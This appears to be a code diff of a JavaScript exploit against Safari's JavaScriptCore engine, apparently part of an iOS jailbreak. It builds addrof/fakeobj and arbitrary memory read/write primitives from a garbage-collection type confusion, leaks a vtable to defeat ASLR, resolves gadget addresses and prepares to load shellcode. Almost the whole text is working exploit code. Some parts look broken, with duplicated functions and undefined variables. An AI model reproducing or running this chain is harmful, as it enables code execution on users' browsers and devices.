@@ -1,43 +1,4 @@
 using('liblogging');
-
-
-/* 
-    Exploit Configuration Settings 
-*/
-
-var YES = true; var NO = false;
-
-var UNITY = new Object();
-UNITY.TEN = 10;
-UNITY.HUNDRED = UNITY.TEN * UNITY.TEN;
-UNITY.THOUSAND = UNITY.HUNDRED * UNITY.HUNDRED;
-UNITY.MILLION = UNITY.THOUSAND * UNITY.THOUSAND;
-UNITY.BILLION = UNITY.MILLION * UNITY.MILLION;
-UNITY.KB = 1024;
-UNITY.MB = UNITY.KB * UNITY.KB;
-UNITY.GB = UNITY.MB * UNITY.MB;
-UNITY.TB = UNITY.GB * UNITY.GB;
-
-var CONFIG = new Object();
-CONFIG.PAYLOAD = {
-    MAX_SIZE: 0x1000000, 
-    URL: ""
-};
-CONFIG.MEMDUMP = {
-    SIZE: 0, 
-    PADDING: 16, 
-    ENABLED: YES
-};
-CONFIG.RESPRING = {
-    ENABLED: NO,
-    REBOOT: NO
-};
-CONFIG.INTEGRITY_CHECKS = {
-    ENABLED: NO,
-    ALLOW_FAIL:YES
-};
-CONFIG.VERBOSITY = VERBOSITY.VERBOSE;
-
 var conversion_buffer = new ArrayBuffer(8);
 var f64 = new Float64Array(conversion_buffer);
 var i32 = new Uint32Array(conversion_buffer);
@@ -45,11 +6,11 @@ var BASE32 = 0x100000000;
 var workbuf = new ArrayBuffer(0x1000000)
 var u32_buffer = new Uint32Array(workbuf);
 var u8_buffer = new Uint8Array(workbuf);
-
 function f2i(f) {
     f64[0] = f;
     return i32[0] + BASE32 * i32[1];
 }
+
 function i2f(i) {
     i32[0] = i % BASE32;
     i32[1] = i / BASE32;
@@ -304,14 +265,95 @@ BinHelper.prototype.f64Xor = function (f1, f2) {
 
     return this.toF64(hi1 ^ hi2, lo1 ^ lo2);
 };
-var bh = new BinHelper();
+
+
+/* 
+    Exploit Configuration Settings 
+*/
+
+var UNITY = new Object();
+UNITY.TEN = 10;
+UNITY.HUNDRED = UNITY.TEN * UNITY.TEN;
+UNITY.THOUSAND = UNITY.HUNDRED * UNITY.HUNDRED;
+UNITY.MILLION = UNITY.THOUSAND * UNITY.THOUSAND;
+UNITY.BILLION = UNITY.MILLION * UNITY.MILLION;
+UNITY.KB = 1024;
+UNITY.MB = UNITY.KB * UNITY.KB;
+UNITY.GB = UNITY.MB * UNITY.MB;
+UNITY.TB = UNITY.GB * UNITY.GB;
+
+var CONFIG = new Object();
+var YES = true; var NO = false;
+CONFIG.PAYLOAD = {
+    MAX_SIZE: 0x1000000, 
+    URL: ""
+};
+CONFIG.MEMDUMP = {
+    SIZE: 0, 
+    PADDING: 16, 
+    ENABLED: YES
+};
+CONFIG.RESPRING = {
+    ENABLED: NO
+};
+CONFIG.INTEGRITY_CHECKS = {
+    ENABLED: NO
+};
+CONFIG.VERBOSITY = VERBOSITY.VERBOSE;
+
+bh = new BinHelper();
 
 var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10; //Check for spectre mitigations
+
 var STRUCT_ID = 0x800;
 var ZONE = 0x2F;
 var ZONE_SPAM = 0x40;
 
-var b2hex = function(v){ return '0x'+parseInt(v).toString(16); };
+function check_integrity(buffer)
+{
+    function gethashes(str) {
+        return {
+            md5: md5(str),
+            sha1: Sha1.hash(str),
+            sha256: sha512_256(str),
+            sha384: sha384(str),
+            sha512: sha512(str)
+        };
+    };
+    if(CONFIG.INTEGRITY_CHECKS_ENABLED) {
+        var shellcode_data = new Uint8Array(buffer);
+        var shellcode_hashes = gethashes(shellcode_data.join(''));
+        
+        if(
+            shellcode_hashes.md5 !== "ea21cf2e6a39ed1ff842d719ec9f3396" || 
+            shellcode_hashes.sha1 !== "162d54f4f9214fb8c8099b48cc97a60543220e1c" ||
+            shellcode_hashes.sha256 !== "e00592b23afda7aeb7ee6ec7baf8b2b70d64b1110d26b31921c50003378fdc2b" ||
+            shellcode_hashes.sha384 !== "72dd7c0573513c0033cf67d8700ed069644a1f3ff4249b0b271a29047ba3b66b0c66f5d31dc16ed54731fc19300e4a50" ||
+            shellcode_hashes.sha512 !== "fb2d3b8509f15a57b72574e5c11b11808b7882cf385a41d49344ca7a0e3910c380e9fe7f72b7a8b717780ccb9e847b0cb55686c56f44688a8876ce56aa8403a0"
+        )
+        {
+            throw new Error('Shellcode integrity check failed.');
+        } else {
+            alert('Shellcode integrity checks passed!');
+        }
+    } else {
+        alert(
+            JSON.stringify(
+                gethashes(
+                    new Uint8Array(buffer).join('')
+                )
+            )
+        );
+    }
+}
+
+var b2hex = function(v)
+{
+    return '0x'+parseInt(v).toString(16);
+};
+
+
+// Arbitrary r/w, addrof/matrialize helper taken from [1].
 var stage1 = function (boxed, unboxed, idx) {
     this.boxed   = boxed;
     this.unboxed = unboxed;
@@ -336,7 +378,7 @@ var stage1 = function (boxed, unboxed, idx) {
 
     let caddr = this.addrof(container);
 
-    let master  = this.materialize(bh.f64AddU32(caddr, 0x10));
+    let master  = this.materialize(bh.f64AddU32(caddr, FPO));
 
     this.slave     = slave;
     this.master    = master;
@@ -350,34 +392,43 @@ stage1.prototype.addrof = function (o) {
     this.boxed[0] = o;
     return this.unboxed[this.idx];
 };
+
 stage1.prototype.materialize = function (a) {
     this.unboxed[this.idx] = a;
     return this.boxed[0];
 };
+
 stage1.prototype.write64 = function (a, v) {
     // overwrite slaves buterfly
-    this.master[1] = bh.f64AddU32(a, 0x10);
+    this.master[1] = bh.f64AddU32(a, FPO);
     this.slave.X = this.materialize(v);
     this.master[1] = this.slaveBfly;
 };
+
 stage1.prototype.read64 = function(a) {
-    let addr = bh.f64AddU32(a, 0x10);
+    let addr = bh.f64AddU32(a, FPO);
     this.master[1] = addr;
     let ret = this.addrof(this.slave.X);
     this.master[1] = this.slaveBfly;
     return ret;
 };
+
+// change master's cell to an unboxed array with no properties
+// which is going to help us survive garbage collection
+// in case we need it. 
 stage1.prototype.remaster = function() {
     let unboxed = [];
     unboxed[0] = 1.1;
     let cell = this.read64AtObj(unboxed);
     this.container.p0 = bh.f64JSValue(cell);
 };
+
 stage1.prototype.read64AtObj = function(o, off=0) {
     let a = this.addrof(o);
     a = bh.f64AddU32(a, off);
     return this.read64(a);
 };
+
 stage1.prototype.test = function() {
     let o = [];
     o[0] = 1.1;
@@ -389,30 +440,17 @@ stage1.prototype.test = function() {
     return x1 === 2.2;
 };
 
-var persistantwriter = function(){};
-persistantwriter.write = function(msg){
-    var log = localStorage.getItem('log');
-    if(!log) log = '';
-    log += Date.now()+":<br>"+msg+'<br><br>';
-    localStorage.setItem('log', log);
-};
-persistantwriter.read = function(){
-    var log = (localStorage.getItem('log') || false);
-    return log;
-};
-persistantwriter.clear = function(){localStorage.clear();};
-
-print = function(msg, popup = false) {
-    if(popup) alert(msg);
-    persistantwriter.write(msg+'\n');
+function print(msg) {
     puts(msg);
-};
+}
 
+// triggers garbage collection
 function __gc() {
     for (var i=0; i<0x100; i++) {
         new Uint32Array(0x100 * 0x100);
     }
 }
+
 var evil_function = function (tmp, refill) {
     // modify tmp structure, so we can refill 
     tmp.__proto__ = {};
@@ -420,6 +458,7 @@ var evil_function = function (tmp, refill) {
     // clain former structure of tmp
     refill.__proto__ = {};
 }
+
 function foo(tmp, refill) {
 
     var result=0;
@@ -441,8 +480,9 @@ function foo(tmp, refill) {
 }
 _off = {};
 
-var pwn = function(){
-    print("Triggering garbage collector");
+var pwn = function()
+{
+
     __gc();
     // force JavaScriptCore to produce baseline jit for foo
     for (var i=0; i<100; i++) {
@@ -520,10 +560,10 @@ var pwn = function(){
     var fakeDoubleArr = foo(target, refill, true);
 
     if (fakeDoubleArr == undefined) {
-        throw new Error("Exploit failed: could not spawn fake double.");
+        print("could not spawn fake double, bailing ...");
     }
 
-    print("FakeDoubleArray: "+bh.f64ToStr(fakeDoubleArr));
+    //alert(bh.f64ToStr(fakeDoubleArr));
 
     // spam boxed arrays with the same butterfly size
     // as we are planning to allocate for unboxed,
@@ -594,115 +634,298 @@ var pwn = function(){
     // [1] https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1
     // by @_niklasb.
     print("magic: " + magicIdx.toString(16));
-    if(magicIdx.toString(16) == '0') throw new Error("Failed leak butterfly");
-    
     let rw = new stage1(boxed, unboxed, magicIdx);
+    // make sure our arbitrary read/write works
+    alert("rw test: " + rw.test());
+
+    var structure_spray = [];
+    for (var i = 0; i < 1000; ++i) {
+        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
+        ary['prop'+i] = 1;
+        structure_spray.push(ary);
+    }
+    var manager = structure_spray[500];
+    var leak_addr = rw.addrof(manager);
     
-    if(!rw.test()) throw new Error("Seems like we coulnd't gain r/w.");
+    alert('leaking from '+b2hex(leak_addr));
+
+    function alloc_above_manager(expr) {
+        var res
+        do {
+            for (var i = 0; i < ALLOCS; ++i) {
+                structure_spray.push(eval(expr));
+            }
+            res = eval(expr);
+        } while (rw.addrof(res) < leak_addr)
+        return res;
+    }
+    
+    alert(1);
+    var sunboxed_size = 100;
+    var sunboxed = alloc_above_manager('[' + '13.37,'.repeat(sunboxed_size) + ']'); //array with double
+    var sboxed = alloc_above_manager('[{}]'); //array with object
+    var svictim = alloc_above_manager('[]'); //array
+
+    svictim.p0 = 0x1337; //first padding
+    
+    function victim_write(val) {
+        svictim.p0 = val;
+    }
+    
+    function victim_read() {
+        return svictim.p0;
+    }
+    
+    i32[0] = 0x200;                // Structure ID
+    i32[1] = 0x01082007 - 0x10000; // Fake JSCell metadata, adjusted for boxing
+    var outer = {
+        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
+        p1: f64[0],
+        p2: manager,
+        p3: 0xfffffff, // Butterfly indexing mask
+    };
+    
+    var fake_addr = rw.addrof(outer) +FPO+0x8;
+    
+    print('fake object is at ' + b2hex(fake_addr));
+    
+    var sunboxed_addr = rw.addrof(unboxed);
+    var sboxed_addr = rw.addrof(boxed);
+    var svictim_addr = rw.addrof(victim);
+    
+    print('' 
+            + 'leak '       + b2hex(sleak_addr)
+            + '\nunboxed '  + b2hex(sunboxed_addr)
+            + '\nboxed '    + b2hex(sboxed_addr)
+            + '\nvictim '   + b2hex(svictim_addr)
+    );
+
+    var holder = {fake: {}};
+    holder.fake = stage1.fakeobj(fake_addr);
+    
+
+    var sshared_butterfly = f2i(holder.fake[(sunboxed_addr + 8 - leak_addr) / 8]);
+    var sboxed_butterfly = holder.fake[(sboxed_addr + 8 - leak_addr) / 8];
+    holder.fake[(sboxed_addr + 8 - leak_addr) / 8] = i2f(sshared_butterfly);
+    
+    var victim_butterfly = holder.fake[(svictim_addr + 8 - leak_addr) / 8];
+    
+    function set_victim_addr(where) {
+        holder.fake[(svictim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10);
+    }
+    
+    function reset_victim_addr() {
+        holder.fake[(svictim_addr + 8 - leak_addr) / 8] = svictim_butterfly;
+    }
+    
+    alert('Stage (1/2) done.');
+
 
     // Read some vtables, you should be able to see
     // authenticated pointer if you are on XS.
     var wrapper = document.createElement('div')
     var el = rw.read64AtObj(wrapper, FPO);
-    print("element is at 0x" + bh.f64ToStr(el));
+    alert("el: " + bh.f64ToStr(el));
 
     var vtable = rw.read64(el);
-    print("element vtable is at 0x" + bh.f64ToStr(vtable));
+    alert("vtable: " + bh.f64ToStr(vtable));
 
     let fn = rw.read64(vtable);
     fn = rw.read64(vtable);
-    print("element function is at 0x" + bh.f64ToStr(fn));
+    alert("fn: " + bh.f64ToStr(fn));
 
     let inst = rw.read64(fn);
-    print("element instance is " + bh.f64ToStr(inst));
+    alert("inst: " + bh.f64ToStr(inst));
+
+    alert("And now the offsets and ASLR!");
 
     var slide =  parseInt('0x'+bh.f64ToStr(vtable)) - _off.vtable;
+   // alert('dyld shared cache slide: 0x'+slide.toString(16));
     var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
     var callbacks = _off.callbacks + slide;
     var g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
+    //var g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
     var longjmp = _off.longjmp + slide;
     var dlsym = _off.dlsym + slide;
+
+  //  var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
+   // var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
+// var jitWriteSeparateHeapsFunction = rw.read64(_off.jit_writeseperateheaps_func + slide);
+  //  var useFastPermisionsJITCopy = rw.read64(_off.usefastpermissions_jitcopy + slide);
+
     var ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
+    //var pop_x8 = _off.modelio_popx8 + slide;
+   // var pop_x2 = _off.coreaudio_popx2 + slide;
     var linkcode_gadget = _off.linkcode_gadget + slide;
 
-    // var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
-    // var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
-    // var jitWriteSeparateHeapsFunction = rw.read64(_off.jit_writeseperateheaps_func + slide);
-    // var useFastPermisionsJITCopy = rw.read64(_off.usefastpermissions_jitcopy + slide);
-    // var pop_x8 = _off.modelio_popx8 + slide;
-    // var pop_x2 = _off.coreaudio_popx2 + slide;
-    // var callback_vector = stage2.read64(callbacks);
-   //  var poison = stage2.read64(g_typedArrayPoisons + 6*8);
-
-    print(''
-        + '\nASLR Slide ' + b2hex(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
-        + '\ncallbacks @ ' + b2hex(callbacks) //callback vector
-        + '\nlongjmp @ ' + b2hex(longjmp) //symbol
-        + '\ndlsym @ ' + b2hex(dlsym) //dlsym symbol, used for referincing a symbol by string
-        + '\ndisablePrimitiveGigacage @ ' + b2hex(disablePrimitiveGigacage) //symbol
-        + '\ng_gigacageBasePtrs @ ' + b2hex(g_gigacageBasePtrs) //symbol
-        //  + '\njitWriteSeparateHeapsFunction @ ' + b2hex(jitWriteSeparateHeapsFunction) //not yet implemented because r/w sucks
-        //  + '\nuseFastPermisionsJITCopy @ ' + b2hex(useFastPermisionsJITCopy) //not yet implemented because r/w sucks
-        + '\nlinkCode gadget @ ' + b2hex(linkcode_gadget) //symbol, used in stage2
-    ,true);
-
+    alert('\nASLR Slide ' + b2hex(slide)
+        + '\ncallbacks @ ' + b2hex(callbacks)
+        + '\nlongjmp @ ' + b2hex(longjmp)
+        + '\ndlsym @ ' + b2hex(dlsym)
+        + '\ndisablePrimitiveGigacage @ ' + b2hex(disablePrimitiveGigacage)
+        + '\ng_gigacageBasePtrs @ ' + b2hex(g_gigacageBasePtrs)
+      //  + '\njitWriteSeparateHeapsFunction @ ' + b2hex(jitWriteSeparateHeapsFunction)
+   //     + '\nuseFastPermisionsJITCopy @ ' + b2hex(useFastPermisionsJITCopy)
+        + '\nlinkCode gadget @ ' + b2hex(linkcode_gadget)
+    );
     alert("Thats as far as I can get rightnow, please don't push me, only push changes.");
+  //  var callback_vector = stage2.read64(callbacks);
+   // var poison = stage2.read64(g_typedArrayPoisons + 6*8);
 
    // wrapper.addEventListener('click', function(){});
     // to get code execution refer to [1] for iPhones up to XS, 
     // XS models will require a different approach ...
-    foo = undefined;
+
     // Die, since we have fake object still referenced by the foo function,
     // so the garbage collection is going to try to walk
     // it causing a crash. There might be some other reasons as well ...
+   
 }
 
-function check_integrity(buffer){
+function print(msg) {
+    puts(msg);
+};
 
-    function gethashes(str) {
-        return {
-            md5: md5(str),
-            sha1: Sha1.hash(str),
-            sha256: sha512_256(str),
-            sha384: sha384(str),
-            sha512: sha512(str)
-        };
-    };
-    if(CONFIG.INTEGRITY_CHECKS_ENABLED) {
-        var shellcode_data = new Uint8Array(buffer);
-        var shellcode_hashes = gethashes(shellcode_data.join(''));
-        
-        if(
-            shellcode_hashes.md5 !== "ea21cf2e6a39ed1ff842d719ec9f3396" || 
-            shellcode_hashes.sha1 !== "162d54f4f9214fb8c8099b48cc97a60543220e1c" ||
-            shellcode_hashes.sha256 !== "e00592b23afda7aeb7ee6ec7baf8b2b70d64b1110d26b31921c50003378fdc2b" ||
-            shellcode_hashes.sha384 !== "72dd7c0573513c0033cf67d8700ed069644a1f3ff4249b0b271a29047ba3b66b0c66f5d31dc16ed54731fc19300e4a50" ||
-            shellcode_hashes.sha512 !== "fb2d3b8509f15a57b72574e5c11b11808b7882cf385a41d49344ca7a0e3910c380e9fe7f72b7a8b717780ccb9e847b0cb55686c56f44688a8876ce56aa8403a0"
-        )
-        {
-            throw new Error('Shellcode integrity check failed.');
-        } else {
-            print('Shellcode integrity checks passed!');
-        }
-    } else {
-        print("Hashes: "+
-            JSON.stringify(
-                gethashes(
-                    new Uint8Array(buffer).join('')
-                )
-            )
-        );
+var b2hex = function(v)
+{
+    return '0x'+parseInt(v).toString(16);
+};
+
+// Arbitrary r/w, addrof/matrialize helper taken from [1].
+var stage1 = function (boxed, unboxed, idx) {
+    this.boxed   = boxed;
+    this.unboxed = unboxed;
+    this.idx  = idx;
+
+    let slavePad = new Array(0x10);
+
+    for (var i=0; i<slavePad.length; i++) {
+        let f = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
+        p6:bh.toF64JSValue(0x10000, 0x10000)};  
+        slavePad[i] = f;
+    }
+    let slave = slavePad.pop();
+    slave[0] = 1.1;
+    slave.X = 1.1;
+
+    let cellArrDouble = bh.toF64JSValue(0x01082107, STRUCT_ID);
+
+    let container = {};
+    container.p0 = cellArrDouble;
+    container.p1 = slave;
+
+    let caddr = this.addrof(container);
+
+    let master  = this.materialize(bh.f64AddU32(caddr, 0x10));
+
+    this.slave     = slave;
+    this.master    = master;
+    this.container = container;
+    this.slaveBfly = master[1];
+
+    this.remaster();
+};
+
+stage1.prototype.addrof = function (o) {
+    this.boxed[0] = o;
+    return this.unboxed[this.idx];
+};
+
+stage1.prototype.materialize = function (a) {
+    this.unboxed[this.idx] = a;
+    return this.boxed[0];
+};
+
+stage1.prototype.write64 = function (a, v) {
+    // overwrite slaves buterfly
+    this.master[1] = bh.f64AddU32(a, 0x10);
+    this.slave.X = this.materialize(v);
+    this.master[1] = this.slaveBfly;
+}
+
+stage1.prototype.read64 = function(a) {
+    let addr = bh.f64AddU32(a, 0x10);
+    this.master[1] = addr;
+    let ret = this.addrof(this.slave.X);
+    this.master[1] = this.slaveBfly;
+    return ret;
+};
+
+// change master's cell to an unboxed array with no properties
+// which is going to help us survive garbage collection
+// in case we need it. 
+stage1.prototype.remaster = function() {
+    let unboxed = [];
+    unboxed[0] = 1.1;
+
+    let cell = this.read64AtObj(unboxed);
+    this.container.p0 = bh.f64JSValue(cell);
+};
+
+stage1.prototype.read64AtObj = function(o, off=0) {
+    let a = this.addrof(o);
+    a = bh.f64AddU32(a, off);
+    return this.read64(a);
+};
+
+stage1.prototype.test = function() {
+    let o = [];
+    o[0] = 1.1;
+    let bfly = this.read64AtObj(o, 8);
+
+    this.write64(bfly, 2.2);
+    let x1 = this.read64(bfly);
+
+    return x1 === 2.2;
+};
+
+function print(msg) {
+    puts(msg);
+}
+
+// triggers garbage collection
+function __gc() {
+    for (var i=0; i<0x100; i++) {
+        new Uint32Array(0x100 * 0x100);
     }
 }
 
-var wk1201go = function()
+var evil_function = function (tmp, refill) {
+    // modify tmp structure, so we can refill 
+    tmp.__proto__ = {};
+    __gc();
+    // clain former structure of tmp
+    refill.__proto__ = {};
+}
+
+function foo(tmp, refill) {
+
+    var result=0;
+    var i=0;
+    for (let k in tmp) {
+        if (i > 0) {
+            evil_function(tmp, refill);
+        }
+        // if i > 0, at this point refill has the same
+        // structure as tmp had before, meaning
+        // the id check is going to pass
+        // and m_cachedInlineCapacity is going to be 
+        // used to read k as an inline property on refill
+        result = refill[k];
+        i++;
+    }
+
+    return result;
+}
+
+
+var wk1140go = function()
 {
-    (persistantwriter.read() || print("No previous logs, probably first time jailbreaking!"));
-    persistantwriter.clear();
-    if(!window.chosendevice.offsets) print("For some reasons offsets are missing, continuing anyway...");
+
+    if(!window.chosendevice.offsets) alert("For some reasons offsets are missing, continuing anyway...");
     _off = window.chosendevice.offsets;
 
-    print("Exploit has been called and is awaiting shellcode.");
+    console.log("Exploit has been called and is awaiting shellcode.");
     
     this.callback = function(buffer){
         try 
@@ -710,17 +933,17 @@ var wk1201go = function()
             
             if(!buffer) return false; //sanity check
 
-            print("Shellcode has been received, checking validity.");
+            console.log("Shellcode has been received, checking validity.");
             
             var shellcode_length = buffer.byteLength;
             if(shellcode_length > CONFIG.PAYLOAD.MAX_SIZE) throw "Shellcode exceeds maximum size";
-            print("Received "+shellcode_length+" bytes of shellcode.");
+           // alert("Received "+shellcode_length+" bytes of shellcode.");
            // check_integrity(buffer);
             return pwn();
         } 
         catch(ex)
         {
-            print(ex);
+            alert(ex);
         }
     };
     FileStorage.getcontents(FileStorage.mode.FETCH, 'testmacho', this.callback);
